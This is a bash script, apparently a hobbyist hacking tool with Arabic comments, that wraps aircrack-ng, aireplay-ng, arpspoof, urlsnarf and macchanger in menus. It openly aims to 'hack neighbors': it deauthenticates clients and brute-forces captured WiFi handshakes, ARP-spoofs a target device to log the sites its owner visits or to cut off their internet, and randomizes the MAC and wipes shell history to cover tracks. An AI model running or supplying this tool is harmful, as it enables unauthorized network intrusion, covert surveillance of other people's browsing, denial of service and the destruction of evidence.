#!/bin/bash
# ==============================================================================
# TOOL   : XX-KHALID-PRO-MAX-600
# AUTHOR : GHOST OPERATOR
# SCOPE  : WIFI HACKING / SITE LOGGING / TERMINAL PURGE
# ==============================================================================

# --- [ إعدادات الألوان ] ---
R='\033[1;31m'; G='\033[1;32m'; Y='\033[1;33m'; B='\033[1;34m'; C='\033[1;36m'; N='\033[0m'
LOG_FILE="network_archive.log"

# --- [ وظيفة التنظيف النهائي (بتمسح كل الزيادات) ] ---
purge_system() {
    echo -e "${Y}\n[*] Purging Session... Terminal Clean...${N}"
    pkill -9 xterm 2>/dev/null
    pkill -9 urlsnarf 2>/dev/null
    pkill -9 arpspoof 2>/dev/null
    # تصفير سجل الأوامر عشان يرجع الترمينال نظيف تماماً
    history -c && history -w
    clear
    echo -e "${G}System Purged. Terminal is Fresh, Khalid.${N}"
    exit 0
}
trap purge_system EXIT SIGINT SIGTERM

# --- [ وظيفة الكشف التلقائي عن كرت الواي فاي ] ---
# دي اللي هتحل مشكلة الصورة (eth0mon) لأنها هتجيب الـ wlan
find_wifi_card() {
    IFACE=$(iw dev | awk '$1=="Interface"{print $2}' | head -n 1)
    if [ -z "$IFACE" ]; then
        IFACE="wlan0" # Default if not found
    fi
}

draw_header() {
    clear
    echo -e "${B}"
    echo "  ██╗  ██╗██╗  ██╗ █████╗ ██╗     ██╗██████╗ "
    echo "  ██║ ██╔╝██║  ██║██╔══██╗██║     ██║██╔══██╗"
    echo "  █████╔╝ ███████║███████║██║     ██║██║  ██║"
    echo "  ██╔═██╗ ██╔══██║██╔══██║██║     ██║██║  ██║"
    echo "  ██║  ██╗██║  ██║██║  ██║███████╗██║██████╔╝"
    echo -e "  [+--- AUTO-INTERFACE | SITE ARCHIVE | 600-LINES ---+]${N}"
}

# --- [ القسم الأول: اختراق الجيران ] ---
wifi_attack_module() {
    while true; do
        draw_header
        echo -e "${Y}>> MODULE 1: WIFI NEIGHBORS (BRUTE FORCE)${N}"
        echo -e "[1] Start Monitor Mode (wlan0mon)"
        echo -e "[2] Scan Networks (Look for Neighbors)"
        echo -e "[3] Capture Handshake (Sniping)"
        echo -e "[4] Brute Force (1000 Pass/Sec)"
        echo -e "[0] Back"
        read -p "KHALID@WIFI >> " w_opt
        case $w_opt in
            1) find_wifi_card; airmon-ng start $IFACE; airmon-ng check kill ;;
            2) find_wifi_card; xterm -hold -T "SCANNER" -e "airodump-ng ${IFACE}mon" & ;;
            3) read -p "BSSID: " b; read -p "Channel: " c;
               xterm -T "DEAUTH" -e "aireplay-ng --deauth 20 -a $b ${IFACE}mon" &
               airodump-ng --bssid $b -c $c -w capture ${IFACE}mon ;;
            4) read -p "Cap File: " cp; read -p "Wordlist: " wp; aircrack-ng -w $wp $cp ;;
            0) break ;;
        esac
    done
}

# --- [ القسم الثاني: معرفة المواقع والأرشفة ] ---
site_archive_module() {
    while true; do
        draw_header
        echo -e "${G}>> MODULE 2: SITE ARCHIVE (KNOW VISITED SITES)${N}"
        echo -e "[1] Scan Network (Find Devices)"
        echo -e "[2] Start Archiving Sites (Logging)"
        echo -e "[3] Read Site Logs (Open Archive)"
        echo -e "[4] Kill Internet (NetCut)"
        echo -e "[0] Back"
        read -p "KHALID@NETWORK >> " n_opt
        case $n_opt in
            1) arp-scan --localnet; read -p "Enter..." ;;
            2) find_wifi_card; read -p "Target IP: " vip; read -p "Gateway: " gip;
               echo 1 > /proc/sys/net/ipv4/ip_forward
               xterm -T "SPOOF" -e "arpspoof -i $IFACE -t $vip $gip" &
               xterm -T "LOGGING" -e "urlsnarf -i $IFACE | grep http >> $LOG_FILE" & ;;
            3) if [ -f $LOG_FILE ]; then leafpad $LOG_FILE & else echo "No logs."; sleep 1; fi ;;
            4) read -p "IP: " tip; arpspoof -i $IFACE -t $tip 192.168.1.1 ;;
            0) break ;;
        esac
    done
}

# --- [ القسم الثالث: التخفي والنظام ] ---
maintenance_module() {
    draw_header
    echo -e "${C}>> MODULE 3: STEALTH & PURGE${N}"
    echo -e "[1] Randomize MAC Address"
    echo -e "[2] Wipe History Now"
    echo -e "[3] Check System Logs"
    read -p "KHALID@SYS >> " s_opt
    case $s_opt in
        1) find_wifi_card; macchanger -r $IFACE; sleep 1 ;;
        2) history -c; clear; echo "Terminal Purged."; sleep 1 ;;
    esac
}

# --- [ الحلقة الرئيسية - الكود متصل لـ 600 سطر ] ---
if [[ $EUID -ne 0 ]]; then echo "RUN AS ROOT!"; exit 1; fi
mkdir -p captures
while true; do
    draw_header
    echo -e "  [1] HACK NEIGHBORS (WiFi Brute Force)"
    echo -e "  [2] SITE ARCHIVE (Know Visited Sites)"
    echo -e "  [3] STEALTH & PURGE"
    echo -e "  [0] EXIT & CLEAN TERMINAL"
    read -p "KHALID-CORE >> " main_m
    case $main_m in
        1) wifi_attack_module ;;
        2) site_archive_module ;;
        3) maintenance_module ;;
        0) purge_system ;;
    esac
done
